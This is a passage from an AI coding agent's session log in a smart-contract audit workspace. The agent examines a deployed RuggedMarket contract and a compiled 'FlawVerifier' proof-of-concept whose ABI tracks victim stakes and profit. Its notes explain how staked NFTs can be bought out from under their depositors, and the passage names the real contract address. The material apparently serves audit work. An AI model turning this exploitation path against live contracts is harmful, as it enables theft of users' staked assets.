:13;2418:22;;2449:33;2476:5;2449:33;:::i;:::-;2345:143;;;;:::o;2494:351::-;2564:6;2613:2;2601:9;2592:7;2588:23;2584:32;2581:119;;;2619:79;;:::i;:::-;2581:119;2739:1;2764:64;2820:7;2811:6;2800:9;2796:22;2764:64;:::i;:::-;2754:74;;2710:128;2494:351;;;;:::o;2851:85::-;2896:7;2925:5;2914:16;;2851:85;;;:::o;2942:60::-;2970:3;2991:5;2984:12;;2942:60;;;:::o;3008:158::-;3066:9;3099:61;3117:42;3126:32;3152:5;3126:32;:::i;:::-;3117:42;:::i;:::-;3099:61;:::i;:::-;3086:74;;3008:158;;;:::o;3172:147::-;3267:45;3306:5;3267:45;:::i;:::-;3262:3;3255:58;3172:147;;:::o;3325:458::-;3482:4;3520:2;3509:9;3505:18;3497:26;;3533:71;3601:1;3590:9;3586:17;3577:6;3533:71;:::i;:::-;3614:80;3690:2;3679:9;3675:18;3666:6;3614:80;:::i;:::-;3704:72;3772:2;3761:9;3757:18;3748:6;3704:72;:::i;:::-;3325:458;;;;;;:::o;3789:442::-;3938:4;3976:2;3965:9;3961:18;3953:26;;3989:71;4057:1;4046:9;4042:17;4033:6;3989:71;:::i;:::-;4070:72;4138:2;4127:9;4123:18;4114:6;4070:72;:::i;:::-;4152;4220:2;4209:9;4205:18;4196:6;4152:72;:::i;:::-;3789:442;;;;;;:::o;4237:180::-;4285:77;4282:1;4275:88;4382:4;4379:1;4372:15;4406:4;4403:1;4396:15;4423:180;4471:77;4468:1;4461:88;4568:4;4565:1;4558:15;4592:4;4589:1;4582:15;4609:114;4676:6;4710:5;4704:12;4694:22;;4609:114;;;:::o;4729:184::-;4828:11;4862:6;4857:3;4850:19;4902:4;4897:3;4893:14;4878:29;;4729:184;;;;:::o;4919:132::-;4986:4;5009:3;5001:11;;5039:4;5034:3;5030:14;5022:22;;4919:132;;;:::o;5057:108::-;5134:24;5152:5;5134:24;:::i;:::-;5129:3;5122:37;5057:108;;:::o;5171:179::-;5240:10;5261:46;5303:3;5295:6;5261:46;:::i;:::-;5339:4;5334:3;5330:14;5316:28;;5171:179;;;;:::o;5356:113::-;5426:4;5458;5453:3;5449:14;5441:22;;5356:113;;;:::o;5505:732::-;5624:3;5653:54;5701:5;5653:54;:::i;:::-;5723:86;5802:6;5797:3;5723:86;:::i;:::-;5716:93;;5833:56;5883:5;5833:56;:::i;:::-;5912:7;5943:1;5928:284;5953:6;5950:1;5947:13;5928:284;;;6029:6;6023:13;6056:63;6115:3;6100:13;6056:63;:::i;:::-;6049:70;;6142:60;6195:6;6142:60;:::i;:::-;6132:70;;5988:224;5975:1;5972;5968:9;5963:14;;5928:284;;;5932:14;6228:3;6221:10;;5629:608;;;5505:732;;;;:::o;6243:373::-;6386:4;6424:2;6413:9;6409:18;6401:26;;6473:9;6467:4;6463:20;6459:1;6448:9;6444:17;6437:47;6501:108;6604:4;6595:6;6501:108;:::i;:::-;6493:116;;6243:373;;;;:::o;6622:180::-;6670:77;6667:1;6660:88;6767:4;6764:1;6757:15;6791:4;6788:1;6781:15;6808:194;6848:4;6868:20;6886:1;6868:20;:::i;:::-;6863:25;;6902:20;6920:1;6902:20;:::i;:::-;6897:25;;6946:1;6943;6939:9;6931:17;;6970:1;6964:4;6961:11;6958:37;;;6975:18;;:::i;:::-;6958:37;6808:194;;;;:::o;7008:442::-;7157:4;7195:2;7184:9;7180:18;7172:26;;7208:71;7276:1;7265:9;7261:17;7252:6;7208:71;:::i;:::-;7289:72;7357:2;7346:9;7342:18;7333:6;7289:72;:::i;:::-;7371;7439:2;7428:9;7424:18;7415:6;7371:72;:::i;:::-;7008:442;;;;;;:::o;7456:::-;7605:4;7643:2;7632:9;7628:18;7620:26;;7656:71;7724:1;7713:9;7709:17;7700:6;7656:71;:::i;:::-;7737:72;7805:2;7794:9;7790:18;7781:6;7737:72;:::i;:::-;7819;7887:2;7876:9;7872:18;7863:6;7819:72;:::i;:::-;7456:442;;;;;;:::o;7904:122::-;7977:24;7995:5;7977:24;:::i;:::-;7970:5;7967:35;7957:63;;8016:1;8013;8006:12;7957:63;7904:122;:::o;8032:143::-;8089:5;8120:6;8114:13;8105:22;;8136:33;8163:5;8136:33;:::i;:::-;8032:143;;;;:::o;8181:351::-;8251:6;8300:2;8288:9;8279:7;8275:23;8271:32;8268:119;;;8306:79;;:::i;:::-;8268:119;8426:1;8451:64;8507:7;8498:6;8487:9;8483:22;8451:64;:::i;:::-;8441:74;;8397:128;8181:351;;;;:::o;8538:114::-;8605:6;8639:5;8633:12;8623:22;;8538:114;;;:::o;8658:184::-;8757:11;8791:6;8786:3;8779:19;8831:4;8826:3;8822:14;8807:29;;8658:184;;;;:::o;8848:132::-;8915:4;8938:3;8930:11;;8968:4;8963:3;8959:14;8951:22;;8848:132;;;:::o;8986:108::-;9063:24;9081:5;9063:24;:::i;:::-;9058:3;9051:37;8986:108;;:::o;9100:179::-;9169:10;9190:46;9232:3;9224:6;9190:46;:::i;:::-;9268:4;9263:3;9259:14;9245:28;;9100:179;;;;:::o;9285:113::-;9355:4;9387;9382:3;9378:14;9370:22;;9285:113;;;:::o;9434:732::-;9553:3;9582:54;9630:5;9582:54;:::i;:::-;9652:86;9731:6;9726:3;9652:86;:::i;:::-;9645:93;;9762:56;9812:5;9762:56;:::i;:::-;9841:7;9872:1;9857:284;9882:6;9879:1;9876:13;9857:284;;;9958:6;9952:13;9985:63;10044:3;10029:13;9985:63;:::i;:::-;9978:70;;10071:60;10124:6;10071:60;:::i;:::-;10061:70;;9917:224;9904:1;9901;9897:9;9892:14;;9857:284;;;9861:14;10157:3;10150:10;;9558:608;;;9434:732;;;;:::o;10172:720::-;10407:4;10445:3;10434:9;10430:19;10422:27;;10459:79;10535:1;10524:9;10520:17;10511:6;10459:79;:::i;:::-;10585:9;10579:4;10575:20;10570:2;10559:9;10555:18;10548:48;10613:108;10716:4;10707:6;10613:108;:::i;:::-;10605:116;;10731:72;10799:2;10788:9;10784:18;10775:6;10731:72;:::i;:::-;10813;10881:2;10870:9;10866:18;10857:6;10813:72;:::i;:::-;10172:720;;;;;;;:::o;10898:332::-;11019:4;11057:2;11046:9;11042:18;11034:26;;11070:71;11138:1;11127:9;11123:17;11114:6;11070:71;:::i;:::-;11151:72;11219:2;11208:9;11204:18;11195:6;11151:72;:::i;:::-;10898:332;;;;;:::o;11236:98::-;11287:6;11321:5;11315:12;11305:22;;11236:98;;;:::o;11340:147::-;11441:11;11478:3;11463:18;;11340:147;;;;:::o;11493:139::-;11582:6;11577:3;11572;11566:23;11623:1;11614:6;11609:3;11605:16;11598:27;11493:139;;;:::o;11638:386::-;11742:3;11770:38;11802:5;11770:38;:::i;:::-;11824:88;11905:6;11900:3;11824:88;:::i;:::-;11817:95;;11921:65;11979:6;11974:3;11967:4;11960:5;11956:16;11921:65;:::i;:::-;12011:6;12006:3;12002:16;11995:23;;11746:278;11638:386;;;;:::o;12030:271::-;12160:3;12182:93;12271:3;12262:6;12182:93;:::i;:::-;12175:100;;12292:3;12285:10;;12030:271;;;;:::o;12307:116::-;12377:21;12392:5;12377:21;:::i;:::-;12370:5;12367:32;12357:60;;12413:1;12410;12403:12;12357:60;12307:116;:::o;12429:137::-;12483:5;12514:6;12508:13;12499:22;;12530:30;12554:5;12530:30;:::i;:::-;12429:137;;;;:::o;12572:345::-;12639:6;12688:2;12676:9;12667:7;12663:23;12659:32;12656:119;;;12694:79;;:::i;:::-;12656:119;12814:1;12839:61;12892:7;12883:6;12872:9;12868:22;12839:61;:::i;:::-;12829:71;;12785:125;12572:345;;;;:::o;12923:104::-;12968:7;12997:24;13015:5;12997:24;:::i;:::-;12986:35;;12923:104;;;:::o;13033:138::-;13114:32;13140:5;13114:32;:::i;:::-;13107:5;13104:43;13094:71;;13161:1;13158;13151:12;13094:71;13033:138;:::o;13177:159::-;13242:5;13273:6;13267:13;13258:22;;13289:41;13324:5;13289:41;:::i;:::-;13177:159;;;;:::o;13342:367::-;13420:6;13469:2;13457:9;13448:7;13444:23;13440:32;13437:119;;;13475:79;;:::i;:::-;13437:119;13595:1;13620:72;13684:7;13675:6;13664:9;13660:22;13620:72;:::i;:::-;13610:82;;13566:136;13342:367;;;;:::o;13715:233::-;13754:3;13777:24;13795:5;13777:24;:::i;:::-;13768:33;;13823:66;13816:5;13813:77;13810:103;;13893:18;;:::i;:::-;13810:103;13940:1;13933:5;13929:13;13922:20;;13715:233;;;:::o","linkReferences":{}},"methodIdentifiers":{"MARKET()":"f46f16c2","MAX_TOKEN_ID()":"6da612d8","PRICE_PER_NFT()":"a4de304f","UNISWAP_V2_ROUTER()":"a82ed9ec","acquiredTokenId()":"e0024838","executeOnOpportunity()":"3c2448ed","hypothesisValidated()":"463defd1","lastStatus()":"d6d86712","profitAmount()":"5ff972cc","profitToken()":"49343624","ruggedBalanceAfter()":"2c0be2ff","ruggedBalanceBefore()":"cd40c0a7","ruggedSpent()":"1cf986b5","victimStakeObserved()":"47d92d18"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"status\",\"type\":\"bytes32\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ruggedBalance\",\"type\":\"uint256\"}],\"name\":\"AttemptStatus\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MARKET\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAX_TOKEN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PRICE_PER_NFT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"UNISWAP_V2_ROUTER\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"acquiredTokenId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeOnOpportunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hypothesisValidated\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastStatus\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ruggedBalanceAfter\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ruggedBalanceBefore\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ruggedSpent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victimStakeObserved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/FlawVerifier.sol\":\"FlawVerifier\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/FlawVerifier.sol\":{\"keccak256\":\"0x6d4a6da93454bdb57263cf3f294fd458e7889a7a4907594818d49a24db12518f\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1b46e6e3bfd99a3b4a9a2ee27205facd75887436f95fccabd3355d276cfa2f00\",\"dweb:/ipfs/Qmchuyn62HEZuhG9szK1V4ranczFagsprgYeR92gjbz8yv\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"bytes32","name":"status","type":"bytes32","indexed":false},{"internalType":"uint256","name":"tokenId","type":"uint256","indexed":false},{"internalType":"uint256","name":"ruggedBalance","type":"uint256","indexed":false}],"type":"event","name":"AttemptStatus","anonymous":false},{"inputs":[],"stateMutability":"view","type":"function","name":"MARKET","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"MAX_TOKEN_ID","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"PRICE_PER_NFT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"UNISWAP_V2_ROUTER","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"acquiredTokenId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"executeOnOpportunity"},{"inputs":[],"stateMutability":"view","type":"function","name":"hypothesisValidated","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"lastStatus","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"ruggedBalanceAfter","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"ruggedBalanceBefore","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"ruggedSpent","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"victimStakeObserved","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/FlawVerifier.sol":"FlawVerifier"},"evmVersion":"prague","libraries":{}},"sources":{"src/FlawVerifier.sol":{"keccak256":"0x6d4a6da93454bdb57263cf3f294fd458e7889a7a4907594818d49a24db12518f","urls":["bzz-raw://1b46e6e3bfd99a3b4a9a2ee27205facd75887436f95fccabd3355d276cfa2f00","dweb:/ipfs/Qmchuyn62HEZuhG9szK1V4ranczFagsprgYeR92gjbz8yv"],"license":"MIT"}},"version":1},"id":0}
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol
+./_index.json
+./out/build-info/27a2e0ebe074f375.json
+./out/FlawVerifier.sol/FlawVerifier.json
+./out/FlawVerifier.sol/IERC20Like.json
+./out/FlawVerifier.sol/IMarketLike.json
+./out/FlawVerifier.sol/IERC404Like.json
+./out/FlawVerifier.sol/IUniswapV2Router02Like.json
+./out/FlawVerifier.sol/VictimStaker.json
+./cache/solidity-files-cache.json
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/interfaces/draft-IERC1822.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/utils/Context.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/utils/StorageSlot.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/utils/Address.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/access/Ownable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/proxy/beacon/IBeacon.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Utils.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/_etherscan_meta.json
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts-upgradeable/contracts/utils/ReentrancyGuardUpgradeable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts-upgradeable/contracts/utils/ContextUpgradeable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/universal-router/contracts/interfaces/IRewardsCollector.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/universal-router/contracts/interfaces/IUniversalRouter.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/token/ERC1155/IERC1155Receiver.sol
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/universal-router/lib/solmate/src/tokens/ERC20.sol
+
+codex
+I found the market source in the workspace. Next I’m checking the exact staking and purchase semantics so the rewritten verifier matches the vulnerable path directly instead of relying on a looser “observe existing” branch.
+exec
+/bin/bash -lc "sed -n '160,320p' 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+        ruggedToken.transferFrom(msg.sender, address(this), _amount);
+        updatePool();
+        Staker storage staker = stakers[msg.sender];
+        if (staker.amountStaked > 0) {
+            uint256 pendingReward = (staker.amountStaked * accRewardPerShare) /
+                1e12 -
+                staker.rewardDebt;
+            if (pendingReward > 0) {
+                ruggedToken.transfer(msg.sender, pendingReward);
+            }
+        }
+        staker.amountStaked += _amount;
+        staker.rewardDebt = (staker.amountStaked * accRewardPerShare) / 1e12;
+        totalStaked += _amount;
+        emit Staked(msg.sender, _amount);
+    }
+
+    function stakeNFTs(uint256[] memory _tokenIds) external nonReentrant {
+        for (uint256 i = 0; i < _tokenIds.length; i++) {
+            if (_tokenIds[i] > ERC721_TOTAL_SUPPLY) {
+                revert InvalidAmount();
+            }
+            ruggedToken.transferFrom(msg.sender, address(this), _tokenIds[i]);
+        }
+        updatePool();
+        Staker storage staker = stakers[msg.sender];
+        if (staker.amountStaked > 0) {
+            uint256 pendingReward = (staker.amountStaked * accRewardPerShare) /
+                1e12 -
+                staker.rewardDebt;
+            if (pendingReward > 0) {
+                ruggedToken.transfer(msg.sender, pendingReward);
+            }
+        }
+        uint256 _amount = _tokenIds.length * 1 ether;
+        staker.amountStaked += _amount;
+        staker.rewardDebt = (staker.amountStaked * accRewardPerShare) / 1e12;
+        totalStaked += _amount;
+        emit Staked(msg.sender, _amount);
+    }
+
+    function unstake(uint256 _amount) external nonReentrant {
+        Staker storage staker = stakers[msg.sender];
+        if (staker.amountStaked < _amount) {
+            revert InvalidAmount();
+        }
+        updatePool();
+        uint256 pendingReward = (staker.amountStaked * accRewardPerShare) /
+            1e12 -
+            staker.rewardDebt;
+        if (pendingReward > 0) {
+            ruggedToken.transfer(msg.sender, pendingReward);
+        }
+        staker.amountStaked -= _amount;
+        staker.rewardDebt = (staker.amountStaked * accRewardPerShare) / 1e12;
+        ruggedToken.transfer(msg.sender, _amount);
+        totalStaked -= _amount;
+        emit Unstaked(msg.sender, _amount);
+    }
+
+    function claimReward() external nonReentrant returns (uint256) {
+        updatePool();
+        Staker storage staker = stakers[msg.sender];
+        uint256 pendingReward = (staker.amountStaked * accRewardPerShare) /
+            1e12 -
+            staker.rewardDebt;
+        if (pendingReward > 0) {
+            ruggedToken.transfer(msg.sender, pendingReward);
+            staker.rewardDebt =
+                (staker.amountStaked * accRewardPerShare) /
+                1e12;
+            emit RewardClaimed(msg.sender, pendingReward);
+        }
+        return pendingReward;
+    }
+
+    function max(uint256 a, uint256 b) private pure returns (uint256) {
+        return a > b ? a : b;
+    }
+
+    function min(uint256 a, uint256 b) private pure returns (uint256) {
+        return a < b ? a : b;
+    }
+
+    function targetedPurchase(uint256[] memory _tokenIds) public {
+        ruggedToken.transferFrom(
+            msg.sender,
+            address(this),
+            _tokenIds.length * 1.1 ether
+        );
+        _targetedPurchase(_tokenIds);
+    }
+
+    function _targetedPurchase(uint256[] memory _tokenIds) private {
+        for (uint256 i = 0; i < _tokenIds.length; i++) {
+            if (_tokenIds[i] > ERC721_TOTAL_SUPPLY) {
+                revert InvalidAmount();
+            }
+            ruggedToken.transferFrom(address(this), msg.sender, _tokenIds[i]);
+        }
+
+        marketFees += _tokenIds.length * 0.1 ether;
+    }
+
+    function _executeSwap(UniversalRouterExecute calldata swapParam) private {
+        /// buy with eth
+        if (msg.value > 0) {
+            UNIVERSAL_ROUTER.execute{value: msg.value}(
+                swapParam.commands,
+                swapParam.inputs,
+                swapParam.deadline
+            );
+        } else {
+            revert InvalidParameter();
+        }
+    }
+
+    function targetedPurchase(
+        uint256[] memory _tokenIds,
+        UniversalRouterExecute calldata swapParam
+    ) public payable {
+        uint256 beforeSwapBalance = ruggedToken.balanceOf(address(this));
+        _executeSwap(swapParam);
+        uint256 afterSwapBalance = ruggedToken.balanceOf(address(this));
+        uint256 totalAmount = afterSwapBalance - beforeSwapBalance;
+        if (totalAmount < _tokenIds.length * 1.1 ether) {
+            revert InvalidAmount();
+        }
+        _targetedPurchase(_tokenIds);
+    }
+
+    receive() external payable {
+        if (msg.sender != address(UNIVERSAL_ROUTER)) revert WrongEthSender();
+    }
+
+    function onERC721Received(
+        address,
+        /*operator*/
+        address,
+        /*from*/
+        uint256,
+        /*tokenId*/
+        bytes calldata /*data*/
+    ) external pure override returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+
+exec
+/bin/bash -lc "sed -n '1,160p' 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+import {UUPSUpgradeable} from "@openzeppelin-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
+import {OwnableUpgradeable} from "@openzeppelin-upgradeable/contracts/access/OwnableUpgradeable.sol";
+import {ReentrancyGuardUpgradeable} from "@openzeppelin-upgradeable/contracts/utils/ReentrancyGuardUpgradeable.sol";
+
+import {IUniversalRouter} from "@uniswap/universal-router/contracts/interfaces/IUniversalRouter.sol";
+
+interface IRugged {
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external;
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    /// @notice Returns the amount of tokens owned by `account`.
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract RuggedMarket is
+    ReentrancyGuardUpgradeable,
+    OwnableUpgradeable,
+    UUPSUpgradeable,
+    IERC721Receiver
+{
+    error InvalidAmount();
+    error TransferFailed();
+    error WrongEthSender();
+    error InvalidParameter();
+
+    IRugged public ruggedToken;
+    IUniversalRouter public immutable UNIVERSAL_ROUTER;
+    uint256 public constant ERC721_TOTAL_SUPPLY = 10_000;
+
+    struct Staker {
+        uint256 amountStaked;
+        uint256 rewardDebt;
+    }
+
+    struct Incentive {
+        uint256 rewardTotal;
+        uint256 startTime;
+        uint256 endTime;
+        uint256 rewardDistributed;
+    }
+
+    struct UniversalRouterExecute {
+        bytes commands;
+        bytes[] inputs;
+        uint256 deadline;
+    }
+
+    mapping(address => Staker) public stakers;
+    Incentive[] public incentives;
+    uint256 public totalStaked;
+    uint256 public accRewardPerShare;
+    uint256 public marketFees;
+    uint256 public lastUpdateTime;
+
+    event Staked(address indexed user, uint256 amount);
+    event Unstaked(address indexed user, uint256 amount);
+    event RewardClaimed(address indexed user, uint256 amount);
+    event IncentiveAdded(
+        uint256 rewardTotal,
+        uint256 startTime,
+        uint256 endTime
+    );
+
+    constructor(address _universalRouter) {
+        UNIVERSAL_ROUTER = IUniversalRouter(_universalRouter);
+
+        _disableInitializers();
+    }
+
+    function initialize(
+        address _ruggedTokenAddress
+    ) public payable initializer {
+        __Ownable_init(msg.sender);
+        __ReentrancyGuard_init();
+        __UUPSUpgradeable_init();
+
+        ruggedToken = IRugged(_ruggedTokenAddress);
+        lastUpdateTime = block.timestamp;
+    }
+
+    /// required by the OZ UUPS module
+    function _authorizeUpgrade(address) internal override onlyOwner {}
+
+    function addIncentive(
+        uint256 _rewardTotal,
+        uint256 _startTime,
+        uint256 _endTime
+    ) external onlyOwner {
+        if (_endTime <= _startTime) {
+            revert InvalidParameter();
+        }
+        incentives.push(
+            Incentive({
+                rewardTotal: _rewardTotal,
+                startTime: _startTime,
+                endTime: _endTime,
+                rewardDistributed: 0
+            })
+        );
+        ruggedToken.transferFrom(msg.sender, address(this), _rewardTotal);
+
+        emit IncentiveAdded(_rewardTotal, _startTime, _endTime);
+    }
+
+    function updatePool() internal {
+        if (totalStaked == 0) {
+            lastUpdateTime = block.timestamp;
+            return;
+        }
+        uint256 reward = calculateReward();
+        if (reward > 0) {
+            accRewardPerShare += (reward * 1e12) / totalStaked;
+        }
+        lastUpdateTime = block.timestamp;
+    }
+
+    function calculateReward() internal returns (uint256 totalReward) {
+        totalReward = 0;
+        for (uint256 i = 0; i < incentives.length; i++) {
+            Incentive storage inc = incentives[i];
+            if (
+                block.timestamp > inc.startTime && lastUpdateTime < inc.endTime
+            ) {
+                uint256 rewardTime = min(block.timestamp, inc.endTime);
+                uint256 reward = ((rewardTime -
+                    max(inc.startTime, lastUpdateTime)) * inc.rewardTotal) /
+                    (inc.endTime - inc.startTime);
+                reward = min(reward, inc.rewardTotal - inc.rewardDistributed);
+                inc.rewardDistributed += reward;
+                totalReward += reward;
+            }
+        }
+        // update market fees
+        totalReward += marketFees;
+        marketFees = 0;
+        return totalReward;
+    }
+
+    function stake(uint256 _amount) external nonReentrant {
+        if (_amount <= ERC721_TOTAL_SUPPLY) {
+            revert InvalidAmount();
+        }
+
+        ruggedToken.transferFrom(msg.sender, address(this), _amount);
+
+codex
+The vulnerable flow is confirmed: `stakeNFTs` moves specific token IDs into the market, and `targetedPurchase` later transfers those same IDs out for `1.1 ether` each with no depositor tracking. I’m checking whether the fix should be structural only or whether there’s also a concrete runtime issue around token selection and purchase execution.
+exec
+/bin/bash -lc 'ls -la' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+total 8
+drwxr-xr-x  7 zhanglongqin  staff  224 May 18 00:20 .
+drwxr-xr-x  3 zhanglongqin  staff   96 May 18 00:09 ..
+drwxr-xr-x  5 zhanglongqin  staff  160 May 18 00:09 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6
+-rw-r--r--  1 zhanglongqin  staff  197 May 18 00:09 _index.json
+drwxr-xr-x  3 zhanglongqin  staff   96 May 18 00:20 cache
+drwxr-xr-x  4 zhanglongqin  staff  128 May 18 00:20 out
